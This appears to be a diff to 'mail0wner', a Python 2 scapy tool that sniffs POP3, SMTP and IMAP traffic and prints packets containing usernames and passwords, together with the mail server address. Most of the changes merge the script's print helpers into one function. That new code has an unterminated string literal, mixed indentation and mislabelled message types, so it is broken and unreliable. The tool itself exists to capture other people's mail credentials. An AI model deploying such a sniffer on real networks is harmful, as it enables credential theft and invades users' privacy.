@@ -30,15 +30,22 @@ lstInt = options.list
 OK_GREEN = "\033[92m"
 OK_BLUE = "\033[94m"
 ERR = "\033[91m"
+WARN = "\033[93m"
 ENDC = "\033[0m"
 
 #handle colors
-def printMsg(s):
-    print(OK_BLUE + "[*]" + ENDC + " " + s)
-def printGood(s):
-    print(OK_GREEN + "[*]" + ENDC + " " + s)
-def printErr(s):
-    print(ERR + "[!]" + ENDC + " " + s)
+def printMsg(type, content):
+	if type == "msg":
+		print(OK_BLUE + "[*]" + ENDC + " " + content)
+	elif type == "err":
+		print(ERR + "[+]" + ENDC + " " + content)
+	elif type == "good":
+		print(OK_GREEN + "[*]" + ENDC + " " + content)
+	elif type == "warn":
+		print(WARN + "[!]" + ENDC + " " + content)
+	else:
+		print("Unknown type for printMsg(). Options are \"msg\", \"err\", \"good\", or \"warn\".)
+    
 
 def banner():
     banner = """\033[91m
@@ -89,41 +96,41 @@ def packet_callback(packet):
     if packet[TCP].payload:
         mail_packet = str(packet[TCP].payload)
         if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
-            printGood("Server: %s" % packet[IP].dst)
-            printGood("%s" % packet[TCP].payload)
+            printMsg("good", "Server: %s" % packet[IP].dst)
+            printMsg("good", "%s" % packet[TCP].payload)
 
 def sniffer(): # main function that starts sniffer
     try:
 	if 'mon' in iface:
-	    printErr("Monitor mode cards are not supported. Please use another interface.")
+	    printMsg("err", "Monitor mode cards are not supported. Please use another interface.")
 	    exit(1)
         #start sniffer
-        printMsg("Starting Sniffer on interface: " + "\033[93m" + iface + "\033[0m")
+        printMsg("msg", "Starting Sniffer on interface: " + "\033[93m" + iface + "\033[0m")
         time.sleep(1)
-        printMsg("Running for %i seconds..." % options.time)
+        printMsg("msg", "Running for %i seconds..." % options.time)
         try:
             sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=timeout, iface=iface)
             #port 110 = POP3
             #port 143 = IMAP
             #port 25  = SMTP
         except socket.error as se:
-            printErr("Couldn't start sniffer. Try running as root or using another interface")
-        printMsg("Sniffer has finished. Thanks for using mail0wner!")
+            printMsg("err", "Couldn't start sniffer. Try running as root or using another interface")
+        printMsg("msg", "Sniffer has finished. Thanks for using mail0wner!")
         exit(0)
     except OSError as e: #catch unknown interface OSError
-        printErr("Unknown interface: %s. (use the -i switch to specify an interface)" % options.iface)
+        printMsg("msg", "Unknown interface: %s. (use the -i switch to specify an interface)" % options.iface)
         exit(1)
 def main():
     if not os.geteuid() == 0:
-        printErr("Script must be run as root. Exiting...")
+        printMsg("err", "Script must be run as root. Exiting...")
         exit(-1)
     else:
         if lstInt == True:
             banner2()
-            printMsg("Getting interface information...")
+            printMsg("msg", "Getting interface information...")
             time.sleep(1)
             ifaces = netifaces.interfaces()
-            printGood("Available interfaces are: ")
+            printMsg("good", "Available interfaces are: ")
             print ifaces
             exit(0)
 	#elif options.infile != None:
